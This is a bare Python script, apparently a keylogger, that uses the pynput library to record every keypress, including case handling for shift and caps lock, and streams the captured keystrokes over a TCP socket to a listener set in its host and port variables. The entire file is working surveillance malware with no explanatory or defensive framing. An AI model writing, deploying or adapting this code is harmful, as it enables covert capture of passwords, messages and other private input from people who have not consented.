from pynput import keyboard
import socket


host = "127.0.0.1"
port = 1234


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

openedCapslock = False
stickedToShift = False
def on_press(key):
    global openedCapslock
    global stickedToShift

    try:
        if(key == keyboard.Key.backspace):
            s.send('\b'.encode())
        elif(key == keyboard.Key.space):
            s.send(" ".encode())
        elif(key == keyboard.Key.enter):
            s.send("\n".encode())
        elif(key == keyboard.Key.tab):
            s.send("    ".encode()) # four space tab
        elif(key == keyboard.Key.ctrl):
            s.send("$ctrl$".encode())
        elif(key == keyboard.Key.caps_lock):
            openedCapslock = not openedCapslock
        elif(key == keyboard.Key.shift):
            stickedToShift = True
        else:
            if((openedCapslock and not stickedToShift) or (stickedToShift and not openedCapslock)): 
                s.send(key.char.upper().encode())
            else: 
                s.send(key.char.lower().encode())
    except AttributeError:
        pass
 

def on_release(key):
    global stickedToShift
    if(key == keyboard.Key.shift):
        stickedToShift = False

    if key == keyboard.Key.esc:
        s.close()
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

